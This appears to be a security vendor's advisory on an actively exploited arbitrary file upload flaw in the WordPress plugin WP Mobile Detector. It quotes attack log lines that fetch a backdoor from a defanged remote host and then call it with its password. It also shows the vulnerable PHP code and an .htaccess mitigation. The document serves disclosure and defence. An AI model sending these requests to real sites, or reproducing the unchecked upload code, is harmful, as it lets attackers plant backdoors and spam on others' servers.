@@ -1,0 +1,33 @@
+WP Mobile Detector Vulnerability Being Exploited in the Wild
+
+***Update: The WP Mobile Detector plugin has been patched to address the vulnerability. Please update as soon as possible. Note that the latest version don’t fully address the issue and we contacted the developer try to fix it correctly this time.
+
+For the last few days, we have noticed an increasing number of websites infected without any outdated plugin or known vulnerability. In most cases it was a porn spam infection. Our research team started to dig into the issue and found that the common denominator across these WordPress sites was the plugin WP Mobile Detector that had a 0-day arbitrary file upload vulnerability disclosed on May 31st by the Plugin Vulnerabilities team. The plugin has since been removed from the WordPress repository and no patches are available.
+The vulnerability is very easy to exploit, all the attacker needs to do is send a request to resize.php or timthumb.php (yes, timthumb, in this case it just includes resize.php), inside the plugin directory with the backdoor URL. This vulnerability was publicly disclosed May 31st, but according to our firewall logs, the attack has been going since May 27th. The good news is that all our customers have been protected via the Sucuri Firewall virtual hardening engine.
+This is one of the payloads we are actively seeing in the wild:
+188.73.152.166 - - [31/May/2016:23:54:43 -0400] "POST /wp-content/plugins/wp-mobile-detector/resize.php
+Payload:src=hxxp://copia[.]ru/mig/tmp/css.php"
+The example above uploads the css.php to the cache directory inside the plugin folder. After the upload is completed, the attackers try to access the backdoor:
+46.182.30.164 - - [02/Jun/2016:14:25:01 -0400] "POST /wp-content/plugins/wp-mobile-detector/cache/css.php HTTP/1.1"
+
+Payload: pass=dinamit
+
+Using the backdoor password “dinamit”. As far as the vulnerability, the insecure function is inside resize.php at this part of the code:
+if (isset($_REQUEST['src'])) {
+$path = dirname(__FILE__) . "/cache/" . basename($_REQUEST['src']);
+if(file_exists($path)){
+...skipped…
+}else{
+file_put_contents($path, file_get_contents($_REQUEST['src']));
+...skipped…
+}
+...skipped…
+As you can see, it’s a simple vulnerability that stems from failing to validate and sanitize input from untrusted sources. No security checks are performed and an attacker can feed the src variable with a malicious URL that contains a PHP code.
+Unfortunately, at the moment of the release of this post, no updates are available and the plugin has been removed from the repository. We highly recommend everyone to remove this plugin for now. If you really need this plugin, the partial temporary fix will be to disable PHP execution in the wp-mobile-detector/cache subdirectory, for example using this code in the .htaccess file.
+<Files *.php>
+deny from all
+</Files>
+Please note that this fix will only save you from executing malware on your server. Hackers will still be able to upload files to the cache subdirectory and use links to them in attacks to third-party sites (iframes, scripts, malicious downloads) or just to host spammy/illegal content. You can also revoke write permissions in the cache subdirectory altogether, but it may break  the plugin functionality.
+We have been testing this exploits against the most popular WordPress security plugins offering application level firewalls and other preventive measures, it has successfully evaded all existing preventive controls. Sites behind the Sucuri Firewall have been patched via the systems virtual hardening engine that sits at the edge since its release.
+At this moment the majority of the vulnerable sites are infected with the porn spam doorways. You can usually find the gopni3g directory in the site root, that contains story.php (doorway generator script), .htaccess and subdirectories with spammy files and templates. The doorways redirect visitors to hxxp://bipaoeity[.]in/for/77?d=.
+If you’re already infected and need help, let us know.
